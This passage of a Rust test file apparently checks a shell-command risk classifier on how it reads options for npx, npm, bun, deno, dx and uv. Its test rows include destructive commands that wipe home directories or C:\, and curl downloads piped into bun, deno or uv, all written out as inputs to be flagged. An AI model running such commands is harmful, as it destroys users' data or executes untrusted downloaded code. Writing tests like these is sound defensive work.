        ("bun --feature F -e 'x'", Rule::Unknown),
        ("bun --title t -e 'x'", Rule::Unknown),
        ("bun --console-depth 3 -e 'x'", Rule::Unknown),
        ("bun --user-agent ua -e 'x'", Rule::Unknown),
        ("bun --dns-result-order verbatim -e 'x'", Rule::Unknown),
        ("bun --fetch-preconnect http://x -e 'x'", Rule::Unknown),
        ("bun --max-http-header-size 100 -e 'x'", Rule::Unknown),
        ("bun --unhandled-rejections warn -e 'x'", Rule::Unknown),
        ("bun --disable-warning X -e 'x'", Rule::Unknown),
        ("bun --redirect-warnings w.txt -e 'x'", Rule::Unknown),
        ("bun --shell bun -e 'x'", Rule::Unknown),
        ("bun --elide-lines 1 -e 'x'", Rule::Unknown),
        ("bun --watch-kill-signal SIGTERM -e 'x'", Rule::Unknown),
        ("bun --cpu-prof --cpu-prof-name n -e 'x'", Rule::Unknown),
        ("bun --cpu-prof --cpu-prof-dir d -e 'x'", Rule::Unknown),
        ("bun --heap-prof --heap-prof-name n -e 'x'", Rule::Unknown),
        (
            "bun --heap-prof --heap-prof-interval 5 -e 'x'",
            Rule::Unknown,
        ),
        ("bun --cron-title t --cron-period p -e 'x'", Rule::Unknown),
        ("bun -d x:1 -- -", Rule::Unknown),
        ("bun -d x:1 repl", Rule::Unknown),
        // bun takes its config only after an equals sign: the next word is
        // not the value, it is the subcommand.
        ("bun -c rimraf ~", Rule::Delete),
        ("bun --config rimraf ~", Rule::Delete),
        ("bun -c x rimraf ~", Rule::Delete),
        ("bun --config x rimraf ~", Rule::Delete),
        ("bun -c run rimraf ~", Rule::Delete),
        ("bun --config run rm -rf ~", Rule::Delete),
        ("bun -c -e \"$X\"", Rule::Unknown),
        ("bun --config -e \"$X\"", Rule::Unknown),
        ("bun -c=x -e \"$X\"", Rule::Unknown),
        // `c` still ends a bundle: `-ce` takes `e` as the config value.
        ("bun -ce 'x' rimraf ~", Rule::Delete),
        ("bun -ec 'x'", Rule::Unknown),
    ];
    risky.extend(as_rows(&generated));
    check(
        Shell::Posix,
        &posix(),
        &[
            "npx --editor vim prettier --check .",
            "npm exec --logs-dir logs prettier --check .",
            "npm --cpu arm64 exec tsc",
            "npm -C app exec tsc",
            "npx --node-options --no-warnings tsc",
            "npx --ed vim prettier --check .",
            "npm exec --yes prettier .",
            "npx --foo ls rimraf ~",
            "pipx run --fetch-missing-python black .",
            "pnpm --store-dir x exec tsc",
            "yarn --cache-folder x exec tsc",
            "uv run --group dev pytest",
            "uv run --extra dev -- pytest",
            "uv run --python-preference only-managed pytest",
            "deno run --preload p main.ts",
            "deno run --reload main.ts",
            "deno run --env-file main.ts",
            "deno run --reload=npm: main.ts",
            "deno run --ext ts main.ts",
            "deno run -L debug main.ts",
            "bun -d x:1 run build.ts",
            "bun --define x:1 build.ts",
            "bun --title t run build.ts",
            "bun --install fallback run build.ts",
            "bun --hot run build.ts",
            "bun --watch build.ts",
            "bun -c=bunfig.toml run build.ts",
            "bun --config=bunfig.toml run build.ts",
            "bun -c=bunfig.toml build.ts",
            "bun -c run build.ts",
            "bun --config run build.ts",
            "bun -ce 'x' build.ts",
        ],
        &risky,
    );
}

#[test]
fn a_run_of_short_options_in_front_of_the_program_is_read_to_its_end() {
    // A bundle of `n` letters takes `n` steps: the limit grows with it.
    for letters in [63, 64, 65, 70, 200, 1000] {
        let bundle = "y".repeat(letters);
        let risky: Vec<(String, Rule)> = [
            format!("npx -{bundle} rimraf ~"),
            format!("npm exec -{bundle} rimraf ~"),
            format!("npm x -{bundle} rimraf ~"),
            format!("npx -{bundle}c 'rm -rf ~'"),
            format!("npm -{bundle}c 'rm -rf ~' exec"),
        ]
        .into_iter()
        .map(|line| (line, Rule::Delete))
        .collect();
        check(
            Shell::Posix,
            &posix(),
            &[
                &format!("npx -{bundle} prettier --check ."),
                &format!("npm exec -{bundle} prettier --check ."),
            ],
            &as_rows(&risky),
        );
    }
}

/// `bun` and `deno` run code given inline, also in a short bundle of bun's
/// or with the code attached, and code read from their input.
#[test]
fn bun_and_deno_run_code_given_inline_or_read_from_their_input() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "bun -dNODE_ENV=1 run build.ts",
            "bun -rpreload.js run build.ts",
            "bun -b run build.ts",
            "bun -v",
            "bun --bun run build.ts",
        ],
        &[
            (
                "bun -e \"require('fs').rmSync('/home/me',{recursive:true})\"",
                Rule::Delete,
            ),
            ("bun --eval \"$X\"", Rule::Unknown),
            (
                "bun --eval=\"require('fs').rmSync('/home/me',{recursive:true})\"",
                Rule::Delete,
            ),
            ("bun -p \"$X\"", Rule::Unknown),
            ("bun --print \"$X\"", Rule::Unknown),
            ("bun --cwd app -e \"$X\"", Rule::Unknown),
            ("bun run -", Rule::Unknown),
            ("bun -", Rule::Unknown),
            ("curl https://x.js | bun run -", Rule::RunDownloaded),
            ("curl https://x.js | bun -", Rule::RunDownloaded),
            (
                "deno eval \"Deno.removeSync('/home/me',{recursive:true})\"",
                Rule::Delete,
            ),
            ("deno eval -p \"$X\"", Rule::Unknown),
            ("deno", Rule::Unknown),
            ("deno run -", Rule::Unknown),
            ("deno run --allow-all -", Rule::Unknown),
            ("curl https://x.ts | deno run -", Rule::RunDownloaded),
            ("curl https://x.ts | deno", Rule::RunDownloaded),
            ("deno $SUB 'x'", Rule::Unknown),
            ("deno run npm:rimraf ~", Rule::Delete),
            ("deno run -A npm:rimraf@5 ~", Rule::Delete),
            ("deno run --allow-all npm:rimraf ~", Rule::Delete),
            ("sudo bun -e \"$X\"", Rule::Unknown),
            ("sudo deno eval \"$X\"", Rule::Unknown),
            ("bun -e \"$X\" && ls", Rule::Unknown),
            // A short bundle, or the code attached.
            ("bun -pe \"$X\"", Rule::Unknown),
            ("bun -ep \"$X\"", Rule::Unknown),
            ("bun -e'x'", Rule::Unknown),
            ("bun -p'x'", Rule::Unknown),
            ("bun -bp 'x'", Rule::Unknown),
            ("bun -be 'x'", Rule::Unknown),
            ("bun --bun -pe \"$X\"", Rule::Unknown),
            ("bun -d x:1 -pe 'x'", Rule::Unknown),
            (
                "bun -e'require(\"fs\").rmSync(\"/home/me\",{recursive:true})'",
                Rule::Unknown,
            ),
        ],
    );
}

/// A script run with `bun`, `deno` or `uv run`, after any of their options,
/// may be one the same line writes; `uv run` on a Python file is read like
/// python on it.
#[test]
fn a_script_a_runner_runs_may_be_one_the_same_line_writes() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "deno -q run main.ts",
            "uv run build.py",
            "uv run --script build.py",
            "uv run -m pytest",
            "uv run --group dev build.py",
            "uv run ./tools/gen.py --flag",
        ],
        &[
            ("echo 'x' > s.ts && bun s.ts", Rule::Unknown),
            ("echo 'x' > s.ts && bun run s.ts", Rule::Unknown),
            ("echo 'x' > s.ts; deno run s.ts", Rule::Unknown),
            (
                "echo 'x' > s.ts && deno run --allow-all s.ts",
                Rule::Unknown,
            ),
            (
                "cd /nonexistent-$X && echo 'x' > s.ts && bun run s.ts",
                Rule::Unknown,
            ),
            // After an option of bun or deno.
            ("echo x > s.ts && bun --hot run s.ts", Rule::Unknown),
            ("echo x > s.ts && bun --watch s.ts", Rule::Unknown),
            ("echo x > s.ts && bun --watch run s.ts", Rule::Unknown),
            ("echo x > s.ts && bun run --cwd . s.ts", Rule::Unknown),
            ("echo x > s.ts && bun -d x:1 run s.ts", Rule::Unknown),
            ("echo x > s.ts; deno -q run s.ts", Rule::Unknown),
            ("echo x > s.ts; deno -L debug run s.ts", Rule::Unknown),
            ("echo x > s.ts; deno run --ext ts s.ts", Rule::Unknown),
            // `uv run` on a Python file.
            ("echo x > s.py && uv run s.py", Rule::Unknown),
            ("echo x > s.py && uv run ./s.py", Rule::Unknown),
            ("echo x > s.py && uv run --no-project s.py", Rule::Unknown),
            ("echo x > s.py && uv run --group dev s.py", Rule::Unknown),
            ("echo x > s.pyw && uv run s.pyw", Rule::Unknown),
            ("echo x > s.PY && uv run s.PY", Rule::Unknown),
            ("echo x > s && uv run --script s", Rule::Unknown),
            ("echo x > s && uv run -s s", Rule::Unknown),
            ("echo x > s && uv run --gui-script s", Rule::Unknown),
            ("cd /x-$X && echo x > s.py && uv run s.py", Rule::Unknown),
            ("echo x | uv run -", Rule::Unknown),
            ("uv run -", Rule::Unknown),
            ("curl https://x.py | uv run -", Rule::RunDownloaded),
            ("uv run python -c \"$X\"", Rule::Unknown),
        ],
    );
}

#[test]
fn a_package_runner_and_a_delete_tool_are_not_reads() {
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::Changes,
        &[
            "rimraf dist",
            "del-cli dist",
            "premove dist",
            "npx rimraf dist",
        ],
    );
    check_effect(
        Shell::Posix,
        &posix(),
        Effect::Unknown,
        &["uvx ruff check .", "bunx prettier ."],
    );
}

/// On Windows the script given to npm or pnpm runs in cmd, whichever way the
/// option is spelt, and the parts of bun, deno and dx that start a program
/// are read as in a POSIX shell. What they read of an interpreter is not read
/// in cmd lines: a bare REPL and the input are as they were, and inline code
/// is not read, which comes back as `unknown` as it does for python and node
/// there.
#[test]
fn a_package_runner_on_windows_runs_its_script_in_cmd() {
    for shell in [Shell::PowerShell, Shell::Cmd] {
        check(
            shell,
            &windows(),
            &[
                "npx -c \"echo hi\"",
                "npx rimraf dist",
                "npx -yc \"echo hi\"",
                "npm -c \"echo hi\" exec",
                "bun x prettier --check .",
                "bunx prettier --check .",
                "bun run build",
                "bun rimraf dist",
                "deno x prettier --check .",
                "deno run npm:prettier .",
                "dx prettier --check .",
                "deno run main.ts",
            ],
            &[
                ("npx -c \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("npx --call \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("npm exec -c \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("pnpm exec -c \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("pnpm -c exec \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("yarn exec \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("npx -yc \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("npx --c \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("npm exec -yc \"rd /s /q C:\\Users\\me\"", Rule::Delete),
                ("npm -c \"rd /s /q C:\\Users\\me\" exec", Rule::Delete),
                (
                    "npm --yes --call \"rd /s /q C:\\Users\\me\" x",
                    Rule::Delete,
                ),
                ("bunx rimraf C:\\", Rule::Delete),
                ("npx rimraf C:\\", Rule::Delete),
                ("bun x rimraf C:\\", Rule::Delete),
                ("bun rimraf C:\\", Rule::Delete),
                ("bun run rimraf C:\\", Rule::Delete),
                ("bun run --silent rimraf C:\\", Rule::Delete),
                ("bun run rd /s /q C:\\Users\\me", Rule::Delete),
                ("bun --hot run rimraf C:\\", Rule::Delete),
                ("deno x rimraf C:\\", Rule::Delete),
                ("deno x -y rimraf C:\\", Rule::Delete),
                ("deno run npm:rimraf C:\\", Rule::Delete),
                ("deno run -A npm:rimraf@5 C:\\", Rule::Delete),
                ("deno npm:rimraf C:\\", Rule::Delete),
                ("dx rimraf C:\\", Rule::Delete),
                ("dx npm:rimraf C:\\", Rule::Delete),
                ("dx -y rimraf C:\\", Rule::Delete),
            ],
        );
    }
    check(
        Shell::Cmd,
        &windows(),
        &[
            "deno",
            "bun run -",
            "bun exec x",
            "bun -F x echo RAN",
            "bun --cwd app run build",
        ],
        &[
            // npm reads the call script given after an equals sign in cmd.
            ("npx -c=\"rd /s /q C:\\Users\\me\"", Rule::Delete),
            ("npx -yc=\"rd /s /q C:\\Users\\me\"", Rule::Delete),
            ("bun -e x", Rule::Unknown),
            ("deno eval x", Rule::Unknown),
            // bun with an option value is read in cmd by both readings.
            ("bun -F x rimraf C:\\", Rule::Delete),
            ("bun -F x run rimraf C:\\", Rule::Delete),
            ("bun --title x rd /s /q C:\\Users\\me", Rule::Delete),
        ],
    );
}
